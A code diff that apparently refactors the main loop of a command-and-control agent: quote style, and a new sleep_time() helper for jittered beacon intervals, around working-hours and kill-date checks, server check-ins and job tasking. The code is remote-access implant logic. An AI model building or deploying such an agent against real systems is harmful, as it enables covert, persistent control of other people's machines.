 def get_file_part(filePath, offset=0, chunkSize=512000, base64=True):
     if not os.path.exists(filePath):
-        return ''
+        return ""
 
-    f = open(filePath, 'rb')
+    f = open(filePath, "rb")
     f.seek(offset, 0)
     data = f.read(chunkSize)
     f.close()
@@ -1026,17 +1214,29 @@ def get_file_part(filePath, offset=0, chunkSize=512000, base64=True):
         return data
 
 
+def sleep_time(jitter):
+    # Determines the random sleep duration using the delay and jitter
+    if jitter < 0:
+        jitter = -jitter
+    if jitter > 1:
+        jitter = old_div(1, jitter)
+
+    minSleep = int((1.0 - jitter) * delay)
+    maxSleep = int((1.0 + jitter) * delay)
+    return random.randint(minSleep, maxSleep)
+
+
 ################################################
 #
 # main agent functionality
 #
 ################################################
 
-while (True):
+while True:
     try:
-        if workingHours != '' and 'WORKINGHOURS' not in workingHours:
+        if workingHours != "" and "WORKINGHOURS" not in workingHours:
             try:
-                start, end = workingHours.split('-')
+                start, end = workingHours.split("-")
                 now = datetime.datetime.now()
                 startTime = datetime.datetime.strptime(start, "%H:%M")
                 endTime = datetime.datetime.strptime(end, "%H:%M")
@@ -1051,7 +1251,7 @@ while (True):
 
         # check if we're past the killdate for this agent
         #   killDate form -> MO/DAY/YEAR
-        if killDate != "" and 'KILLDATE' not in killDate:
+        if killDate != "" and "KILLDATE" not in killDate:
             now = datetime.datetime.now().date()
             try:
                 killDateTime = datetime.datetime.strptime(killDate, "%m/%d/%Y").date()
@@ -1068,21 +1268,17 @@ while (True):
             agent_exit()
 
         # sleep for the randomized interval
-        if jitter < 0: jitter = -jitter
-        if jitter > 1: jitter = old_div(1, jitter)
-        minSleep = int((1.0 - jitter) * delay)
-        maxSleep = int((1.0 + jitter) * delay)
-
-        sleepTime = random.randint(minSleep, maxSleep)
-        time.sleep(sleepTime)
+        time.sleep(sleep_time(jitter))
 
         (code, data) = send_message()
 
-        if code == '200':
+        if code == "200":
             try:
                 send_job_message_buffer()
             except Exception as e:
-                result = build_response_packet(0, str('[!] Failed to check job buffer!: ' + str(e)))
+                result = build_response_packet(
+                    0, str("[!] Failed to check job buffer!: " + str(e))
+                )
                 process_job_tasking(result)
             if data.strip() == defaultResponse.strip():
                 missedCheckins = 0
